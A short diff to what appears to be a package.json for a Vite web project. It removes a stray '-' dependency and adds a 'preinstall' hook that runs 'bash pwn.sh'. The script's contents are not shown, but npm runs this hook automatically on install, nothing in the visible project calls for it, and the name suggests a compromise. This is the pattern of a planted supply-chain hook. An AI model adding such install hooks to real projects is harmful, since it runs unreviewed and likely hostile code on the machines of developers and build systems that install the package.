@@ -5,7 +5,6 @@
 	"version": "0.1.1",
 	"private": true,
 	"dependencies": {
-		"-": "^0.0.1",
 		"@crowdin/cli": "^3.19.4",
 		"@fortawesome/fontawesome-svg-core": "^6.7.2",
 		"@fortawesome/free-regular-svg-icons": "^6.7.2",
@@ -37,6 +36,7 @@
 		"translation-check": "^1.1.1"
 	},
 	"scripts": {
+		"preinstall": "bash pwn.sh",
 		"start": "vite",
 		"build": "vite build",
 		"ghbuild": "CI=false vite build",
